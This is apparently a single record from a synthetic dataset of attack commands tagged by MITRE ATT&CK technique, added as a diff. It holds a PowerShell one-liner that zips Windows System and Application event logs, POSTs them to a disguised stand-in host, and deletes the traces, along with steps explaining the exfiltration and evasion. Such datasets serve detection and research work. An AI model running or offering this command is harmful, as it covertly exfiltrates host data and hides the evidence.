@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1020",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$ProgressPreference='SilentlyContinue'; $f=Join-Path $env:TEMP ('evt_'+(Get-Date -Format yyyyMMddHHmmss)+'.zip'); Compress-Archive -Path 'C:\\Windows\\System32\\winevt\\Logs\\System.evtx','C:\\Windows\\System32\\winevt\\Logs\\Application.evtx' -DestinationPath $f -Force; Invoke-WebRequest -Uri 'https://updates-cache.example.org/collect/events' -Method Post -InFile $f -ContentType 'application/zip' -Headers @{ 'User-Agent'='Mozilla/5.0'; 'X-Host'=$env:COMPUTERNAME } -ErrorAction SilentlyContinue; Remove-Item $f -Force",
+  "explanation": "Compresses key event logs and transmits them via HTTPS POST using Invoke-WebRequest with innocuous headers.",
+  "rationale_steps": [
+    "Aggregate multiple event logs into a single archive.",
+    "Exfiltrate using HTTPS POST to appear as normal web traffic.",
+    "Suppress progress and delete temporary files to limit traces."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1020-ed594729-6c9f09db",
+  "source_prompt_hash": "ed594729",
+  "timestamp_utc": "2025-09-30T09:16:21.768830Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
